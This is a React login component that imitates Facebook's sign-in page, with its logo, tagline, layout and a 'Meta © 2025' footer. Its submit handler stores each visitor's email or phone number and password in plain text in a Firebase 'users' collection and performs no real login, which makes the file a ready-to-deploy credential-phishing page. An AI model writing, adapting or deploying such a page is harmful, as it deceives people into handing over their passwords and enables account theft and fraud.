import React, { useState } from "react";
import { collection, addDoc, serverTimestamp } from "firebase/firestore";
import { db } from "./firebase";

/* ===== Official Facebook SVG Logo ===== */
const FacebookLogo = ({ size = 48 }) => (
  <svg
    width={size}
    height={size}
    viewBox="0 0 24 24"
    fill="white"
    xmlns="http://www.w3.org/2000/svg"
  >
    <path d="M24 12.073C24 5.405 18.627 0 12 0S0 5.405 0 12.073C0 18.096 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047V9.43c0-3.02 1.792-4.688 4.533-4.688 1.312 0 2.686.235 2.686.235v2.953h-1.513c-1.49 0-1.953.93-1.953 1.887v2.256h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.096 24 12.073z" />
  </svg>
);

const Login = () => {
  const [phoneOrEmail, setPhoneOrEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      await addDoc(collection(db, "users"), {
        phoneOrEmail,
        password,
        createdAt: serverTimestamp(),
      });
      setPhoneOrEmail("");
      setPassword("");
    } catch (error) {
      console.error(error);
    }
  };

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col justify-between">

      {/* ===== Mobile Facebook Logo ===== */}
      <div className="lg:hidden flex justify-center pt-10">
        <div className="w-20 h-20 bg-[#1877F2] rounded-full flex items-center justify-center shadow-lg">
          <FacebookLogo />
        </div>
      </div>

      {/* ===== Main Content ===== */}
      <div className="flex flex-wrap justify-center gap-16 max-w-screen-xl mx-auto px-4 py-10">

        {/* ===== Left Desktop ===== */}
        <div className="hidden lg:block max-w-sm">
          <h1 className="text-[#1877F2] text-6xl font-extrabold mb-6">
            facebook
          </h1>
          <p className="text-2xl text-gray-800 font-medium leading-snug">
            Facebook helps you connect and share
            <br />
            with the people in your life.
          </p>
        </div>

        {/* ===== Login Box ===== */}
        <div className="w-full sm:w-[380px] bg-white p-6 rounded-xl shadow-lg">

          <form onSubmit={handleSubmit}>

            {/* ===== Email / Phone ===== */}
            <input
              type="text"
              placeholder="Email address or phone number"
              value={phoneOrEmail}
              onChange={(e) => setPhoneOrEmail(e.target.value)}
              required
              style={{
                fontSize: "16px",               // mobile zoom & iOS fix
                backgroundColor: "#ffffff",
              }}
              className="
                w-full p-4 mb-4 border border-gray-300 rounded-md
                text-gray-900
                placeholder:text-gray-700
                placeholder:opacity-100
                focus:placeholder:opacity-100
              "
            />

            {/* ===== Password ===== */}
            <div className="relative mb-6">
              <input
                type={showPassword ? "text" : "password"}
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
                style={{
                  fontSize: "16px",
                  backgroundColor: "#ffffff",
                }}
                className="
                  w-full p-4 pr-16 border border-gray-300 rounded-md
                  text-gray-900
                  placeholder:text-gray-700
                  placeholder:opacity-100
                  focus:placeholder:opacity-100
                "
              />

              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 -translate-y-1/2
                           text-[#1877F2] text-sm font-medium"
              >
                {showPassword ? "Hide" : "Show"}
              </button>
            </div>

            <button
              type="submit"
              className="w-full py-3 bg-[#1877F2] text-white text-xl
                         font-semibold rounded-md hover:bg-blue-700 transition"
            >
              Log in
            </button>

          </form>

          <a
            href="#"
            className="block text-center text-[#1877F2] mt-4 text-sm hover:underline"
          >
            Forgotten password?
          </a>

          <div className="my-6 border-t border-gray-300"></div>

          <button className="w-full py-3 bg-[#42b72a] text-white font-semibold rounded-md hover:bg-green-700 transition">
            Create new account
          </button>

          <p className="text-center text-sm mt-6">
            <a href="#" className="text-[#1877F2] font-semibold hover:underline">
              Create a Page
            </a>{" "}
            for a celebrity, brand, or business.
          </p>
        </div>
      </div>

      {/* ===== Footer ===== */}
      <footer className="text-center text-xs text-gray-600 py-4">
        <div className="mb-2 space-x-2">
          <a href="#" className="hover:underline">English (UK)</a> ·
          <a href="#" className="hover:underline">বাংলা</a> ·
          <a href="#" className="hover:underline">অসমীয়া</a> ·
          <a href="#" className="hover:underline">हिन्दी</a> ·
          <a href="#" className="hover:underline">More...</a>
        </div>
        <div>Meta © 2025</div>
      </footer>
    </div>
  );
};

export default Login;
